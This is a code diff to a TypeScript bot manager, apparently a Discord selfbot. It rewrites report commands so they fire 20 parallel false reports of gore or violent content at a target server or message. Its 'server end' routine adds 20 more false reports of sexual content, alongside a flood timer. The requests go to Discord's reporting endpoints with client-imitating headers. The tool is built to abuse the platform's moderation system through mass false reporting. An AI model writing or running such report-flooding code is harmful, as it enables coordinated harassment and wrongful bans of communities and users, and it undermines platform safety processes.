@@ -3867,22 +3867,24 @@ export class BotManager {
                 'X-Discord-Timezone': 'America/New_York',
             };
 
-            // Walk every branch of the menu tree and return all leaf-node paths
-            const getAllLeafPaths = (nodes: Record<number, any>, rootId: number): number[][] => {
-                const results: number[][] = [];
-                const dfs = (id: number, path: number[]) => {
-                    const node = nodes[id];
-                    if (!node) return;
-                    const newPath = [...path, id];
-                    const children: Array<{ target_node_id: number }> = node.children || [];
-                    if (node.button?.type === 'submit' || node.is_auto_submit || children.length === 0) {
-                        results.push(newPath);
-                        return;
-                    }
-                    for (const child of children) dfs(child.target_node_id, newPath);
-                };
-                dfs(rootId, []);
-                return results;
+            // Walk to a specific leaf in the menu tree by keyword priority (visited set prevents cycles)
+            const walkToLeaf = (nodes: Record<number, any>, rootId: number, keywords: string[]): number[] => {
+                const path: number[] = [];
+                const visited = new Set<number>();
+                let cur: number = rootId;
+                for (let depth = 0; depth < 20; depth++) {
+                    if (visited.has(cur)) break;
+                    visited.add(cur);
+                    const node = nodes[cur];
+                    if (!node) break;
+                    path.push(cur);
+                    if (node.button?.type === 'submit' || node.is_auto_submit) break;
+                    const children: Array<{ name: string; target_node_id: number }> = node.children || [];
+                    if (children.length === 0) break;
+                    const match = children.find(c => keywords.some(kw => (c.name || '').toLowerCase().includes(kw)));
+                    cur = match ? match.target_node_id : children[0].target_node_id;
+                }
+                return path;
             };
 
             // ── .report server <guild_id> ─────────────────────────────────────
@@ -3895,47 +3897,44 @@ export class BotManager {
 
                 await message.edit(`\`\`\`ansi\n\u001b[1;33m[~] Fetching report menu for server ${guildId}...\u001b[0m\n\`\`\``).catch(() => {});
 
-                let allPaths: number[][] = [];
+                let gorePath: number[] = [];
                 let menuVariant = '3';
                 try {
                     const menuRes = await fetch('https://discord.com/api/v9/reporting/menu/guild', { headers: rptHeaders });
                     if (menuRes.ok) {
                         const menu = await menuRes.json() as any;
                         menuVariant = String(menu.variant || '3');
-                        allPaths = getAllLeafPaths(menu.nodes || {}, menu.root_node_id);
+                        gorePath = walkToLeaf(menu.nodes || {}, menu.root_node_id, ['gore', 'animal cruelty', 'violent shock', 'shock content', 'violent', 'graphic']);
                     }
-                } catch { /* fallback below */ }
+                } catch { /* fall through to v1 */ }
 
-                if (allPaths.length === 0) allPaths = [[]]; // will fall through to v1
-
-                await message.edit(`\`\`\`ansi\n\u001b[1;33m[~] Sending ${allPaths.length} category reports for server ${guildId}...\u001b[0m\n\`\`\``).catch(() => {});
+                await message.edit(`\`\`\`ansi\n\u001b[1;33m[~] Sending 20 gore reports for server ${guildId}...\u001b[0m\n\`\`\``).catch(() => {});
 
                 let success = 0; let failed = 0;
-                await Promise.all(allPaths.map(async (breadcrumbs) => {
-                    let sent = false;
-                    if (breadcrumbs.length > 0) {
+                await Promise.all(Array.from({ length: 20 }, async () => {
+                    // Try v3 breadcrumb report first
+                    if (gorePath.length > 0) {
                         try {
                             const res = await fetch('https://discord.com/api/v9/reporting/guild', {
                                 method: 'POST', headers: rptHeaders,
-                                body: JSON.stringify({ version: '1.0', variant: menuVariant, name: 'guild', language: 'en', breadcrumbs, guild_id: guildId }),
+                                body: JSON.stringify({ version: '1.0', variant: menuVariant, name: 'guild', language: 'en', breadcrumbs: gorePath, guild_id: guildId }),
                             });
-                            if (res.status === 201 || res.ok) { success++; sent = true; }
+                            if (res.status === 201 || res.ok) { success++; return; }
                         } catch { /* fall through */ }
                     }
-                    if (!sent) {
-                        try {
-                            const res = await fetch('https://discord.com/api/v9/report', {
-                                method: 'POST', headers: rptHeaders,
-                                body: JSON.stringify({ guild_id: guildId, channel_id: null, message_id: null, reason: 2 }),
-                            });
-                            if (res.ok || res.status === 201 || res.status === 204) { success++; } else { failed++; }
-                        } catch { failed++; }
-                    }
+                    // Fallback: v1 reason 8 = gore / violent content
+                    try {
+                        const res = await fetch('https://discord.com/api/v9/report', {
+                            method: 'POST', headers: rptHeaders,
+                            body: JSON.stringify({ guild_id: guildId, channel_id: null, message_id: null, reason: 8 }),
+                        });
+                        if (res.ok || res.status === 201 || res.status === 204) { success++; } else { failed++; }
+                    } catch { failed++; }
                 }));
 
                 const failNote = failed > 0 ? `  \u001b[1;31m(${failed} failed)\u001b[0m` : '';
                 await message.edit(
-                    `\`\`\`ansi\n\u001b[1;32m[✓] ${success}/${allPaths.length} reports sent for server ${guildId} (all categories).${failNote}\u001b[0m\n\`\`\``
+                    `\`\`\`ansi\n\u001b[1;32m[✓] ${success}/20 gore reports sent for server ${guildId}.${failNote}\u001b[0m\n\`\`\``
                 ).catch(() => {});
                 return;
             }
@@ -3954,51 +3953,47 @@ export class BotManager {
 
                 await message.edit(`\`\`\`ansi\n\u001b[1;33m[~] Fetching message report menu...\u001b[0m\n\`\`\``).catch(() => {});
 
-                let allPaths: number[][] = [];
-                let menuVariant = '3';
+                let msgGorePath: number[] = [];
+                let msgMenuVariant = '3';
                 try {
                     const menuRes = await fetch('https://discord.com/api/v9/reporting/menu/message', { headers: rptHeaders });
                     if (menuRes.ok) {
                         const menu = await menuRes.json() as any;
-                        menuVariant = String(menu.variant || '3');
-                        allPaths = getAllLeafPaths(menu.nodes || {}, menu.root_node_id);
+                        msgMenuVariant = String(menu.variant || '3');
+                        msgGorePath = walkToLeaf(menu.nodes || {}, menu.root_node_id, ['gore', 'animal cruelty', 'violent shock', 'shock content', 'violent', 'graphic']);
                     }
-                } catch { /* fallback below */ }
+                } catch { /* fall through to v1 */ }
 
-                if (allPaths.length === 0) allPaths = [[]];
-
-                await message.edit(`\`\`\`ansi\n\u001b[1;33m[~] Sending ${allPaths.length} category reports for message ${targetMsgId}...\u001b[0m\n\`\`\``).catch(() => {});
+                await message.edit(`\`\`\`ansi\n\u001b[1;33m[~] Sending 20 gore reports for message ${targetMsgId}...\u001b[0m\n\`\`\``).catch(() => {});
 
                 let success = 0; let failed = 0;
-                await Promise.all(allPaths.map(async (breadcrumbs) => {
-                    let sent = false;
-                    if (breadcrumbs.length > 0) {
+                await Promise.all(Array.from({ length: 20 }, async () => {
+                    if (msgGorePath.length > 0) {
                         try {
                             const res = await fetch('https://discord.com/api/v9/reporting/message', {
                                 method: 'POST', headers: rptHeaders,
                                 body: JSON.stringify({
-                                    version: '1.0', variant: menuVariant, name: 'message', language: 'en',
-                                    breadcrumbs, message_id: targetMsgId, channel_id: targetChanId,
+                                    version: '1.0', variant: msgMenuVariant, name: 'message', language: 'en',
+                                    breadcrumbs: msgGorePath, message_id: targetMsgId, channel_id: targetChanId,
                                     ...(targetGId ? { guild_id: targetGId } : {}),
                                 }),
                             });
-                            if (res.status === 201 || res.ok) { success++; sent = true; }
+                            if (res.status === 201 || res.ok) { success++; return; }
                         } catch { /* fall through */ }
                     }
-                    if (!sent) {
-                        try {
-                            const res = await fetch('https://discord.com/api/v9/report', {
-                                method: 'POST', headers: rptHeaders,
-                                body: JSON.stringify({ guild_id: targetGId, channel_id: targetChanId, message_id: targetMsgId, reason: 0 }),
-                            });
-                            if (res.ok || res.status === 201 || res.status === 204) { success++; } else { failed++; }
-                        } catch { failed++; }
-                    }
+                    // Fallback: v1 reason 8 = gore
+                    try {
+                        const res = await fetch('https://discord.com/api/v9/report', {
+                            method: 'POST', headers: rptHeaders,
+                            body: JSON.stringify({ guild_id: targetGId, channel_id: targetChanId, message_id: targetMsgId, reason: 8 }),
+                        });
+                        if (res.ok || res.status === 201 || res.status === 204) { success++; } else { failed++; }
+                    } catch { failed++; }
                 }));
 
                 const failNote = failed > 0 ? `  \u001b[1;31m(${failed} failed)\u001b[0m` : '';
                 await message.edit(
-                    `\`\`\`ansi\n\u001b[1;32m[✓] ${success}/${allPaths.length} reports sent for message ${targetMsgId} (all categories).${failNote}\u001b[0m\n\`\`\``
+                    `\`\`\`ansi\n\u001b[1;32m[✓] ${success}/20 gore reports sent for message ${targetMsgId}.${failNote}\u001b[0m\n\`\`\``
                 ).catch(() => {});
                 return;
             }
@@ -4234,39 +4229,43 @@ export class BotManager {
                 'X-Discord-Timezone': 'America/New_York',
             };
 
-            // Walk every branch and return all leaf paths
-            const seGetAllLeafPaths = (nodes: Record<number, any>, rootId: number): number[][] => {
-                const results: number[][] = [];
-                const dfs = (id: number, path: number[]) => {
-                    const node = nodes[id];
-                    if (!node) return;
-                    const newPath = [...path, id];
-                    const children: Array<{ target_node_id: number }> = node.children || [];
-                    if (node.button?.type === 'submit' || node.is_auto_submit || children.length === 0) {
-                        results.push(newPath);
-                        return;
-                    }
-                    for (const child of children) dfs(child.target_node_id, newPath);
-                };
-                dfs(rootId, []);
-                return results;
+            // Walk to gore and sexual branches using the safe cycle-aware walker
+            const seWalkToLeaf = (nodes: Record<number, any>, rootId: number, keywords: string[]): number[] => {
+                const path: number[] = [];
+                const visited = new Set<number>();
+                let cur: number = rootId;
+                for (let depth = 0; depth < 20; depth++) {
+                    if (visited.has(cur)) break;
+                    visited.add(cur);
+                    const node = nodes[cur];
+                    if (!node) break;
+                    path.push(cur);
+                    if (node.button?.type === 'submit' || node.is_auto_submit) break;
+                    const children: Array<{ name: string; target_node_id: number }> = node.children || [];
+                    if (children.length === 0) break;
+                    const match = children.find(c => keywords.some(kw => (c.name || '').toLowerCase().includes(kw)));
+                    cur = match ? match.target_node_id : children[0].target_node_id;
+                }
+                return path;
             };
 
-            let seAllPaths: number[][] = [];
+            let seGorePath: number[] = [];
+            let seSexualPath: number[] = [];
             let seMenuVariant = '3';
             try {
                 const menuRes = await fetch('https://discord.com/api/v9/reporting/menu/guild', { headers: seHeaders });
                 if (menuRes.ok) {
                     const menu = await menuRes.json() as any;
                     seMenuVariant = String(menu.variant || '3');
-                    seAllPaths = seGetAllLeafPaths(menu.nodes || {}, menu.root_node_id);
+                    const nodes = menu.nodes || {};
+                    const rootId = menu.root_node_id;
+                    seGorePath   = seWalkToLeaf(nodes, rootId, ['gore', 'animal cruelty', 'violent shock', 'shock content', 'violent', 'graphic']);
+                    seSexualPath = seWalkToLeaf(nodes, rootId, ['sexual', 'explicit', 'graphic sexual', 'unwanted sexual']);
                 }
             } catch { /* fallback to v1 */ }
 
-            if (seAllPaths.length === 0) seAllPaths = [[]];
-
-            // Fire one report per leaf path — all in parallel, as fast as possible
-            const seReportResults = await Promise.all(seAllPaths.map(async (breadcrumbs) => {
+            // 20 gore + 20 sexual in parallel — all as fast as possible
+            const seReport = async (breadcrumbs: number[], v1Reason: number): Promise<boolean> => {
                 if (breadcrumbs.length > 0) {
                     try {
                         const res = await fetch('https://discord.com/api/v9/reporting/guild', {
@@ -4279,14 +4278,19 @@ export class BotManager {
                 try {
                     const res = await fetch('https://discord.com/api/v9/report', {
                         method: 'POST', headers: seHeaders,
-                        body: JSON.stringify({ guild_id: targetGuildId, channel_id: null, message_id: null, reason: 2 }),
+                        body: JSON.stringify({ guild_id: targetGuildId, channel_id: null, message_id: null, reason: v1Reason }),
                     });
                     return res.ok || res.status === 201 || res.status === 204;
                 } catch { return false; }
-            }));
+            };
 
-            const totalSuccess = seReportResults.filter(Boolean).length;
-            const totalFailed  = seAllPaths.length - totalSuccess;
+            const seResults = await Promise.all([
+                ...Array.from({ length: 20 }, () => seReport(seGorePath, 8)),
+                ...Array.from({ length: 20 }, () => seReport(seSexualPath, 5)),
+            ]);
+
+            const totalSuccess = seResults.filter(Boolean).length;
+            const totalFailed  = 40 - totalSuccess;
 
             activeServerEnds.set(configId, false);
 
@@ -4317,8 +4321,9 @@ export class BotManager {
             summary += `  Flood Time             : ${floodElapsed}s\n`;
             summary += `${DIM}${BAR}${RST}\n`;
             summary += `${YLW}REPORTS${RST}\n`;
-            summary += `  Categories Reported    : ${seAllPaths.length}\n`;
-            summary += `  Reports Sent           : ${totalSuccess > 0 ? GRN : RED}${totalSuccess}/${seAllPaths.length}${RST}${totalFailed > 0 ? `  ${RED}(${totalFailed} failed)${RST}` : ''}\n`;
+            summary += `  Gore / Violent Shock  : ${seResults.slice(0,20).filter(Boolean).length > 0 ? GRN : RED}${seResults.slice(0,20).filter(Boolean).length}/20${RST}\n`;
+            summary += `  Explicit / Sexual      : ${seResults.slice(20).filter(Boolean).length > 0 ? GRN : RED}${seResults.slice(20).filter(Boolean).length}/20${RST}\n`;
+            summary += `  Total Reports Sent     : ${totalSuccess > 0 ? GRN : RED}${totalSuccess}/40${RST}${totalFailed > 0 ? `  ${RED}(${totalFailed} failed)${RST}` : ''}\n`;
             summary += `${DIM}${BAR}${RST}\n`;
             summary += wasStopped
                 ? `${YLW}[!] STOPPED EARLY BY USER${RST}\n`
